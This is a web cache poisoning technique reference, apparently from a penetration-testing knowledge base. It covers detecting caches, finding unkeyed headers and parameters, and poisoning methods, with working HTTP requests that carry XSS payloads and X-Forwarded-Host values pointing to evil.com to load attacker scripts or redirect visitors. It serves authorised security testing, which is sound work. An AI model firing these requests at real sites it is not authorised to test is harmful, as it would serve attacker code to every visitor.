---
id: PS-CACHEPOIS
category: Web cache poisoning
lab_count: 13
wstg_refs: [WSTG-INPV-17]
---

# Web Cache Poisoning: Attack Technique Reference

Web cache poisoning manipulates how caching infrastructure stores and serves HTTP responses. The attacker injects malicious content into a response via inputs that the cache does not include in its cache key (unkeyed inputs). When the poisoned response is cached, all subsequent users requesting the same resource receive the attacker's payload. This converts otherwise unexploitable reflected vulnerabilities into stored attacks affecting every visitor.

---

## 1. Detection

### 1A. Identify Caching Behavior

Determine whether the target uses caching and what caching layer is in play:

```
# Check for cache-related response headers
curl -sk -D- https://target.com/ | grep -iE 'x-cache|age|cf-cache|cache-control|via|x-varnish|x-served-by'

# Common cache indicators in response headers:
# X-Cache: HIT / MISS
# Age: 120                    (seconds since cached)
# CF-Cache-Status: HIT        (Cloudflare)
# X-Varnish: 12345 67890      (Varnish, two IDs = cache hit)
# Via: 1.1 varnish (Varnish)
# X-Served-By: cache-iad-1234
```

**Cache presence signals:**
- `X-Cache: HIT` on second request to same URL
- `Age` header incrementing across requests
- Response time drop on second request (cached = fast)
- CDN-specific headers: `CF-Cache-Status`, `X-Vercel-Cache`, `X-Fastly-Request-ID`

### 1B. Determine Cache Key Components

The cache key determines which requests are considered equivalent. Typically it includes the request line (method + path) and Host header, but excludes most other headers, cookies, and sometimes query parameters.

```
# Test if query string is in cache key — add a cache buster
curl -sk -D- 'https://target.com/?cachebuster=abc123'

# Test if a header is in cache key — send same URL with different header values
# Request 1:
curl -sk -D- -H 'X-Forwarded-Host: test1' 'https://target.com/?cb=1'
# Request 2 (same URL, same cache buster):
curl -sk -D- 'https://target.com/?cb=1'
# If Request 2 reflects "test1" -> X-Forwarded-Host is unkeyed
```

### 1C. Identify Unkeyed Inputs

Systematically probe headers that may be excluded from the cache key but processed by the origin:

**Priority headers to test:**
```
X-Forwarded-Host: attacker.com
X-Forwarded-Scheme: http
X-Forwarded-Proto: http
X-Original-URL: /admin
X-Rewrite-URL: /admin
X-Forwarded-For: 127.0.0.1
X-Host: attacker.com
X-Forwarded-Server: attacker.com
Forwarded: host=attacker.com
X-Custom-IP-Authorization: 127.0.0.1
```

**Automated discovery with header-fuzz probe (Rynix plugin):**
1. Right-click request in  Extensions > header-fuzz probe > Guess headers
2. header-fuzz probe sends requests with headers from its built-in wordlist
3. Results logged in record_finding evidence pane (Pro) or extension Output tab (Community)
4. Enable "Add dynamic cache buster" to prevent interference with other users

### 1D. Cache Buster Strategy

Always use cache busters when testing live targets to avoid poisoning real users:

```
# Query parameter cache buster (most common)
?cachebuster=<unique-value>

# Header-based cache buster (when query string is in cache key)
Accept-Encoding: gzip, deflate, cachebuster123
Origin: https://cachebuster123.target.com

# Per-request unique values prevent cross-request cache pollution
```

---

## 2. Techniques

### 2A. Poisoning via Unkeyed Headers

The most common vector. The `X-Forwarded-Host` header is widely processed by applications for URL generation but rarely included in cache keys.

**X-Forwarded-Host reflection into page content:**
```
GET / HTTP/1.1
Host: target.com
X-Forwarded-Host: evil.com

# If response reflects the header in meta tags, script sources, or links:
<meta property="og:image" content="https://evil.com/img/social.png"/>
<script src="https://evil.com/static/analytics.js"></script>
<link rel="canonical" href="https://evil.com/"/>
```

**JavaScript import poisoning:**
```
GET /en HTTP/1.1
Host: target.com
X-Forwarded-Host: evil.com

# Response:
<script src="https://evil.com/resources/js/tracking.js"></script>
# Attacker hosts malicious JS at evil.com/resources/js/tracking.js
# Once cached, all visitors load attacker's JavaScript
```

**XSS via header reflection in meta/link tags:**
```
GET / HTTP/1.1
Host: target.com
X-Forwarded-Host: a."><script>alert(1)</script>"

# Response:
<meta property="og:image" content="https://a."><script>alert(1)</script>"/img/social.png"/>
```

> Lab refs: PS-CACHEPOIS-01

**Unkeyed cookie poisoning:**

Cookies are rarely part of the cache key. If a cookie value is reflected in the response, an attacker can poison the cache for all users regardless of their own cookies:

```
GET / HTTP/1.1
Host: target.com
Cookie: language=en";alert(1);//

# Response reflects cookie in inline JS:
<script>var lang = "en";alert(1);//";</script>
```

> Lab refs: PS-CACHEPOIS-02

### 2B. Multiple Header Combinations

Some applications require two or more headers working together to produce an exploitable response.

```
# Combination: X-Forwarded-Host + X-Forwarded-Scheme
GET /login HTTP/1.1
Host: target.com
X-Forwarded-Host: evil.com
X-Forwarded-Scheme: http

# Step 1: X-Forwarded-Scheme: http triggers 302 redirect to HTTPS
# Step 2: X-Forwarded-Host controls the redirect destination
# Result: 302 Location: https://evil.com/login

# Combined: X-Forwarded-Proto + X-Forwarded-Host
GET / HTTP/1.1
Host: target.com
X-Forwarded-Proto: http
X-Forwarded-Host: evil.com
```

**Chaining protocol downgrade with host override:**
1. `X-Forwarded-Proto: http` forces a redirect from HTTP to HTTPS
2. `X-Forwarded-Host: evil.com` redirects to the attacker's domain instead
3. Cache stores the redirect -- all users visiting the page get redirected to attacker

> Lab refs: PS-CACHEPOIS-03

### 2C. Targeted Cache Poisoning

When the `Vary` header includes values like `User-Agent` or `Cookie`, the cache stores different versions per variation. Poison responses for a specific user agent or demographic.

```
# Step 1: Identify Vary header
Vary: User-Agent

# Step 2: Determine victim's User-Agent (e.g., via comment/forum interaction)

# Step 3: Poison with victim's exact User-Agent
GET / HTTP/1.1
Host: target.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
X-Forwarded-Host: evil.com

# Only users with this exact User-Agent receive the poisoned response
```

**Discovery of unknown unkeyed headers:**

Use header-fuzz probe to discover non-standard headers the application processes. Some frameworks use proprietary headers for routing (e.g., `X-Original-URL`, `X-Rewrite-URL`) that are never part of the cache key.

> Lab refs: PS-CACHEPOIS-04

### 2D. Unkeyed Query String Poisoning

Some caches exclude the entire query string from the cache key while the origin still processes it. A reflected XSS that is normally self-XSS becomes a stored attack.

```
# Detection: Send request with query string, check if cached version serves it to clean requests
# Request 1:
GET /?evil=<script>alert(1)</script> HTTP/1.1
Host: target.com

# Request 2 (no query string, same cache key):
GET / HTTP/1.1
Host: target.com

# If Request 2 returns the XSS payload, the query string is unkeyed
```

**Detection technique when query string is excluded:**

Normal cache busters via query params will not work. Use header-based cache busters instead:
```
Accept-Encoding: gzip, deflate, <unique-value>
Origin: https://<unique-value>.target.com
```

> Lab refs: PS-CACHEPOIS-05

### 2E. Unkeyed Query Parameters

Specific query parameters (not the entire string) may be excluded from the cache key. Analytics parameters like `utm_content`, `utm_source`, `utm_medium`, `utm_campaign` are commonly excluded.

```
# Test UTM parameters
GET /?utm_content=x"><script>alert(1)</script> HTTP/1.1
Host: target.com

# Test common excluded params
GET /?fbclid=<payload> HTTP/1.1
GET /?gclid=<payload> HTTP/1.1
GET /?mc_cid=<payload> HTTP/1.1
```

If the application reflects any part of the URL (including unkeyed params) in the response, the reflected value persists in the cached response served to all users.

> Lab refs: PS-CACHEPOIS-06

### 2F. Cache Parameter Cloaking

Exploit parsing differences between the cache and the origin server for query parameter delimiters.

**Semicolon delimiter (Ruby on Rails):**
```
# Rails treats ; as a parameter delimiter, cache does not
GET /?keyed_param=abc&excluded_param=123;keyed_param=evil-payload HTTP/1.1

# Cache sees: keyed_param=abc (safe cache key)
# Rails sees: keyed_param=evil-payload (semicolon-delimited override)
```

**Double question mark:**
```
# Cache excludes everything after first excluded param
GET /?legit=value?injected=<script>alert(1)</script> HTTP/1.1

# Cache key: /?legit=value
# Server parameter value: value?injected=<script>alert(1)</script>
```

**URL fragment vs query delimiter:**
```
# Some caches strip fragments, servers don't (or vice versa)
GET /?param=value%23injected=payload HTTP/1.1
```

> Lab refs: PS-CACHEPOIS-07

### 2G. Fat GET Requests

Some frameworks accept a body in GET requests and prioritize body parameters over query parameters. The cache keys on the query string but the server processes the body.

```
GET /?param=safe-value HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded

param=<script>alert(1)</script>
```

**Method override for fat GET:**
```
GET /?param=safe-value HTTP/1.1
Host: target.com
X-HTTP-Method-Override: POST
Content-Type: application/x-www-form-urlencoded

param=<script>alert(1)</script>

# Cache keys on GET /?param=safe-value
# Server processes body param due to method override
```

> Lab refs: PS-CACHEPOIS-08

### 2H. URL Normalization Poisoning

When the cache normalizes URL-encoded characters in the cache key but the origin processes them literally (or vice versa), encoded and unencoded requests map to the same cache entry.

```
# Attacker sends (unencoded XSS in path):
GET /search/"><script>alert(1)</script> HTTP/1.1

# Cache normalizes and stores under key: /search/"><script>alert(1)</script>

# Victim navigates to same path — browser URL-encodes it:
GET /search/%22%3E%3Cscript%3Ealert(1)%3C/script%3E HTTP/1.1

# Cache normalizes this to the SAME key → serves poisoned response
# Victim's browser receives unencoded XSS in the response body
```

> Lab refs: PS-CACHEPOIS-09

### 2I. DOM Exploitation via Cache Poisoning

Poison a cached JSON or data response that client-side JavaScript processes unsafely.

```
# Poison a JSON response consumed by frontend JS
GET /api/translations HTTP/1.1
Host: target.com
X-Forwarded-Host: evil.com

# Response (cached):
{"translations": {"welcome": "<img src=x onerror=alert(1)>"}}

# Frontend JS renders translations without sanitization → DOM XSS
```

**Strict cacheability criteria bypass:**

When the cache only stores responses with specific status codes or content types, craft the poisoned request to satisfy those criteria while still injecting malicious content.

> Lab refs: PS-CACHEPOIS-10, PS-CACHEPOIS-11

### 2J. Cache Key Injection

When caches construct keys by concatenating request components without escaping delimiters, craft two different requests that produce the same cache key.

```
# Poison request:
GET /path?param=123 HTTP/1.1
Origin: '-alert(1)-'__

# Cache key: GET /path?param=123__Origin='-alert(1)-'__

# Victim request (matching cache key via param injection):
GET /path?param=123__Origin='-alert(1)-'__ HTTP/1.1

# Both resolve to same cache entry
```

> Lab refs: PS-CACHEPOIS-12

### 2K. Internal Cache Poisoning

Application-level caches (e.g., integrated caching in frameworks) may cache response fragments rather than full responses. These internal caches often lack proper cache keys, so poisoning a single fragment can affect responses across many pages.

```
# Poison an internal cache fragment (e.g., navigation template)
GET / HTTP/1.1
Host: target.com
X-Forwarded-Host: evil.com

# The navigation template caches the script src from X-Forwarded-Host
# Every page that includes this template now serves the poisoned fragment
```

**Key difference from external cache poisoning:**
- External: one URL poisoned = one cached page affected
- Internal: one fragment poisoned = potentially ALL pages affected
- No `X-Cache` headers to confirm -- monitor behavior changes across pages

> Lab refs: PS-CACHEPOIS-13

---

## 3. Cache Key Analysis

### 3A. Determining Cache Key Contents

Systematically identify which request components are part of the cache key:

| Component | Test Method | Keyed If... |
|-----------|-------------|-------------|
| Query string | Send with/without query, compare responses | Different cache entries |
| Specific param | Change one param value, check if new response | Value change = cache miss |
| Host header | Impossible to test directly (routing) | Almost always keyed |
| Cookies | Send request with/without cookie | Different cached versions |
| Accept-Language | Vary header includes it | `Vary: Accept-Language` |
| User-Agent | Vary header includes it | `Vary: User-Agent` |
| Scheme (HTTP/HTTPS) | Check if HTTP and HTTPS share cache | Usually separate |

### 3B. Keyed Header Detection

```
# Step 1: Send request with candidate header, get cached (X-Cache: HIT)
GET /?cb=test1 HTTP/1.1
Host: target.com
X-Forwarded-Host: canary.com

# Step 2: Send identical request WITHOUT the header
GET /?cb=test1 HTTP/1.1
Host: target.com

# If Step 2 returns X-Cache: HIT with canary reflected → header is UNKEYED
# If Step 2 returns X-Cache: MISS → header IS keyed (or cache expired)
```

---

## 4. Unkeyed Inputs Reference

### 4A. Common Unkeyed Headers

| Header | What It Controls | Poisoning Impact |
|--------|-----------------|------------------|
| `X-Forwarded-Host` | Virtual host, URL generation | JS import, redirects, link injection |
| `X-Forwarded-Proto` / `X-Forwarded-Scheme` | Protocol detection (HTTP/HTTPS) | Redirect loops, protocol downgrade |
| `X-Forwarded-For` | Client IP | Access control bypass, IP-based logic |
| `X-Original-URL` / `X-Rewrite-URL` | URL rewriting (IIS/Nginx) | Path override, access control bypass |
| `X-Host` | Alternative host header | Same as X-Forwarded-Host |
| `Forwarded` | Standardized proxy header | Host, proto, IP manipulation |

### 4B. Common Unkeyed Query Parameters

| Parameter | Platform | Why Excluded |
|-----------|----------|-------------|
| `utm_source`, `utm_medium`, `utm_campaign`, `utm_content` | Most CDNs | Analytics tracking |
| `fbclid` | Facebook CDN configs | Click tracking |
| `gclid` | Google CDN configs | Ad click tracking |
| `mc_cid`, `mc_eid` | Mailchimp configs | Email campaign tracking |
| `_ga`, `_gl` | Google Analytics | Session linking |

### 4C. Unkeyed Cookies

Most caches exclude the `Cookie` header entirely. If any cookie value is reflected in the response (language preferences, A/B test variants, user preferences), it is a poisoning vector.

---

## 5. Testing Methodology

### Step-by-Step Cache Poisoning Assessment

1. **Confirm caching exists**: Look for `X-Cache`, `Age`, CDN-specific headers
2. **Identify cache key**: Test which components (path, query, headers) are keyed
3. **Discover unkeyed inputs**: header-fuzz probe for headers; manual testing for query params and cookies
4. **Find a gadget**: The unkeyed input must be reflected or processed in a dangerous way (script src, redirect, inline JS, meta tag)
5. **Craft the poison**: Combine unkeyed input with exploitable gadget
6. **Test with cache buster**: Poison a cache-busted version first to confirm without affecting other users
7. **Remove cache buster**: If confirmed, the clean URL is now poisonable
8. **Verify persistence**: Request the clean URL from a different session/IP to confirm the cached payload is served
9. **Document TTL**: Note the `Cache-Control: max-age` or `Age` header to understand how long the poison persists

### Verification Checklist

- [ ] Unkeyed input identified and confirmed
- [ ] Input reflected or processed in response
- [ ] Poisoned response served to requests WITHOUT the malicious header/param
- [ ] Payload executes in victim context (if XSS) or redirects to attacker domain
- [ ] Cache TTL documented
- [ ] Impact scope assessed (single page vs. site-wide for internal caches)
## Rynix workflow

1. `get_technique_guide` for `web-cache-poisoning` — confirm test objectives.
2. `scope_check` + `register_scope` for the target host.
3. Static pass: `analyze_repo`, `rbac_matrix`, `high_risk_surfaces`.
4. Dynamic pass: `http_probe`, `compare_role_response`.
5. `record_finding` with probe evidence; `track_wstg_test` when mapped.

## Rynix tooling

- `http_probe`
- `compare_role_response`

## Evidence requirements

- Reproducible request/response or role-comparison diff.
- Session ID on all live tool calls.
- Link findings to endpoint + parameter, not generic claims.

## ASVS mapping

- V4 Access Control — role-appropriate responses for protected resources.
- V5 Validation — input handling for injection and parser differentials.

## CWE references

- CWE-284: Improper Access Control
- CWE-20: Improper Input Validation
## GenAI / LLM 2026 notes

- Cross-reference `knowledge/custom/genai_llm_security_2026.md` (OWASP LLM Top 10 mapping).
- Probe AI endpoints with `http_probe` only — no external LLM API keys in Rynix runtime.
- Use `compare_role_response` to detect cross-tenant prompt/response leakage.
- Map findings to LLM01–LLM10 categories in `export_report`.

